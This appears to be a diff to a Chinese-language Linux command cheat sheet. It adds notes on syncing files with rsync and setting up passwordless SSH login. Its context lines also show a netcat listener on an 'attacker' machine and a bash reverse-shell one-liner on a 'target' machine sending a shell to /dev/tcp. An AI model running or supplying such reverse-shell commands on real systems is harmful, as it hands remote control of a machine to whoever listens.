@@ -180,3 +180,21 @@ yum -y install lrzsz
 攻击机（192.168.0.211）：nc -lk 1234
 靶机（192.168.0.121）：bash -i &> /dev/tcp/192.168.0.211/1234 0>&1
 ```
+
+### 7、rsync 同步文件
+```bash
+# 远程拉取文件到本地
+rsync -av root@192.168.0.1:/data1/hadoop/hadoop/logs hadoopLogs
+```
+
+### 8、SSH 免密登录
+```bash
+# 进入当前用户家目录
+cd  ~/.ssh
+
+# 生成公钥和私钥
+ssh-keygen -t rsa 
+# 然后敲（三个回车），就会生成两个文件id_rsa（私钥）、id_rsa.pub（公钥）
+
+ssh-copy-id 目标机器主机名或IP地址
+```
